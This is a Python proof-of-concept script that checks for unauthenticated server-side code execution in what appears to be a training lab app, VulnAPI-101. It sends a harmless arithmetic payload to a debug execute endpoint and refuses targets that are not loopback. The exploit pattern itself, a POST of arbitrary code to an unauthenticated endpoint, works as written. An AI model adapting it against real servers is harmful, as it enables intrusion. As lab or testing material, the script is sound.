#!/usr/bin/env python3
"""Harmless local PoC for VulnAPI-101's unauthenticated Python execution."""

from __future__ import annotations

import argparse
import ipaddress
import json
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urlparse
from urllib.request import HTTPRedirectHandler, Request, build_opener


DEFAULT_TARGET = "http://127.0.0.1:5000"
MARKER = "VULNAPI_RCE_CONFIRMED:42"
PAYLOAD = {"code": "result = 'VULNAPI_RCE_CONFIRMED:' + str(7 * 6)"}


class NoRedirects(HTTPRedirectHandler):
    """Keep a loopback target from redirecting the checker elsewhere."""

    def redirect_request(self, request, file_pointer, code, message, headers, new_url):
        return None


def endpoint_for(target: str) -> str:
    """Return the vulnerable endpoint after enforcing a loopback-only target."""
    parsed = urlparse(target)
    host = parsed.hostname

    if parsed.scheme not in {"http", "https"}:
        raise ValueError("target scheme must be http or https")
    if not host:
        raise ValueError("target must include a hostname")
    if parsed.username or parsed.password:
        raise ValueError("target must not contain credentials")
    if parsed.path not in {"", "/"} or parsed.params or parsed.query or parsed.fragment:
        raise ValueError("target must be an origin such as http://127.0.0.1:5000")

    if host.lower() != "localhost":
        try:
            if not ipaddress.ip_address(host).is_loopback:
                raise ValueError("refusing a non-loopback target")
        except ValueError as exc:
            if str(exc) == "refusing a non-loopback target":
                raise
            raise ValueError("refusing a hostname that is not localhost") from exc

    return target.rstrip("/") + "/api/debug/execute"


def run(target: str, timeout: float) -> int:
    endpoint = endpoint_for(target)
    body = json.dumps(PAYLOAD).encode("utf-8")
    request = Request(
        endpoint,
        data=body,
        method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
    )

    print(f"Target: {endpoint}")
    print("Authentication: none")
    print(f"Payload: {PAYLOAD['code']}")

    try:
        opener = build_opener(NoRedirects)
        with opener.open(request, timeout=timeout) as response:
            status = response.status
            response_body = response.read().decode("utf-8")
    except HTTPError as exc:
        response_body = exc.read().decode("utf-8", errors="replace")
        print(f"FAIL: server returned HTTP {exc.code}: {response_body}", file=sys.stderr)
        return 1
    except URLError as exc:
        print(f"ERROR: could not reach the local target: {exc.reason}", file=sys.stderr)
        return 2

    try:
        data = json.loads(response_body)
    except json.JSONDecodeError:
        print(f"FAIL: server returned HTTP {status} with non-JSON data", file=sys.stderr)
        return 1

    print(f"HTTP status: {status}")
    print(f"Returned result: {data.get('result')}")

    if status == 200 and data.get("success") is True and data.get("result") == MARKER:
        print("PASS: unauthenticated server-side Python execution confirmed.")
        return 0

    print("FAIL: the response did not contain the expected execution marker.", file=sys.stderr)
    return 1


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Safely demonstrate VulnAPI-101's critical local code-execution flaw."
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"loopback origin only (default: {DEFAULT_TARGET})",
    )
    parser.add_argument("--timeout", type=float, default=5.0, help="request timeout in seconds")
    args = parser.parse_args()

    if args.timeout <= 0 or args.timeout > 30:
        parser.error("--timeout must be greater than 0 and no more than 30")

    try:
        return run(args.target, args.timeout)
    except ValueError as exc:
        parser.error(str(exc))


if __name__ == "__main__":
    raise SystemExit(main())
